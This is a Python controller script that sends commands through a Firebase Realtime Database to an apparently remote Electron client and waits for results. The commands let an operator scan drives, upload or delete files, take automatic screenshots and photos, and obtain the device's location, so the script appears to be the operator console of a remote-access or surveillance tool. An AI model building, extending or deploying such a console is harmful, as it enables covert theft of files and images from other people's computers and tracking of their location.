#!/usr/bin/env python3
"""
set_command.py

Python controller for sending commands to Electron and fetching results from Firebase.
"""

import time
import sys
import os
from datetime import datetime, timedelta

try:
    import firebase_admin
    from firebase_admin import credentials, db
except ImportError:
    print("Missing dependency: firebase-admin. Install with:\n  python -m pip install firebase-admin")
    sys.exit(1)

# 🔹 Configuration
SERVICE_KEY = "serviceAccountKey.json"
DB_URL = "https://krishna-app-afc93-default-rtdb.firebaseio.com"

# 🔹 Initialize Firebase
def init_firebase():
    if not os.path.exists(SERVICE_KEY):
        print(f"Error: '{SERVICE_KEY}' not found in {os.getcwd()}")
        sys.exit(1)

    cred = credentials.Certificate(SERVICE_KEY)
    try:
        firebase_admin.initialize_app(cred, {"databaseURL": DB_URL})
    except ValueError:
        # already initialized
        pass

    return db.reference("control")

# 🔹 Push a command to Firebase
def push_command(control_ref, command, location=None):
    payload = {
        "command": command,
        "location": location or "",
        "status": "pending",
        "progress": 0,
        "lastUpdate": datetime.utcnow().isoformat(),
        "error": ""
    }
    try:
        control_ref.update(payload)
        print(f"✅ Command sent -> command: '{command}', location: '{location or 'N/A'}'")
    except Exception as e:
        print(f"❌ Failed to push command: {e}")

# 🔹 Wait for command completion
def wait_for_completion(control_ref, timeout_seconds=600, poll_interval=2):
    deadline = datetime.utcnow() + timedelta(seconds=timeout_seconds)
    try:
        while datetime.utcnow() < deadline:
            try:
                snapshot = control_ref.get()
            except Exception as e:
                print(f"⚠ Error reading Firebase: {e}")
                time.sleep(poll_interval)
                continue

            if snapshot and isinstance(snapshot, dict):
                status = snapshot.get("status", "")
                progress = snapshot.get("progress", 0)
                error = snapshot.get("error", "")
                print(f"[{datetime.utcnow().isoformat()}] status={status}, progress={progress}, error={error}", end="\r")
                if status in ("completed", "failed"):
                    print()
                    return snapshot
            time.sleep(poll_interval)
    except KeyboardInterrupt:
        print("\n⏹ Waiting interrupted by user (Ctrl+C).")
        return None

    print("\n⚠ Timeout waiting for completion")
    return None

# 🔹 Display scanned folders
def display_folders(location):
    if not location:
        print("❌ No location provided")
        return

    drive_key = f"{location.upper()}_drive"
    try:
        folders_ref = db.reference(f"folders/{drive_key}")
        folder_list = folders_ref.get()
    except Exception as e:
        print(f"⚠ Could not read folders from Firebase: {e}")
        return

    if not folder_list:
        print(f"❌ No folders found in Firebase for {drive_key}.")
        return

    print(f"\n📂 Scanned folders for {drive_key}:")
    for i, folder in enumerate(folder_list, 1):
        print(f"{i}: {folder}")

# 🔹 Main interactive loop
def main():
    control_ref = init_firebase()
    print("Enter commands (scan/upload/delete/auto-screenshot/auto-photos/send-location). Type 'exit' to quit.\n")

    while True:
        try:
            command = input("Enter command: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        if not command:
            continue
        if command.lower() == "exit":
            print("Exiting.")
            break

        try:
            location = input("Enter location (C/D/Users folder) or leave empty: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        push_command(control_ref, command, location)
        print("⏳ Waiting for Electron or listener to complete the command... (press Ctrl+C to cancel)")

        final = wait_for_completion(control_ref, timeout_seconds=600)
        if final:
            print(f"✅ Final status: {final.get('status')} | progress={final.get('progress')} | error={final.get('error')}")
            if command.lower() == "scan":
                display_folders(location)
        else:
            print("❌ No final status received (timeout or interrupted)")

        print("\n--- Ready for next command ---\n")

if __name__ == "__main__":
    main()
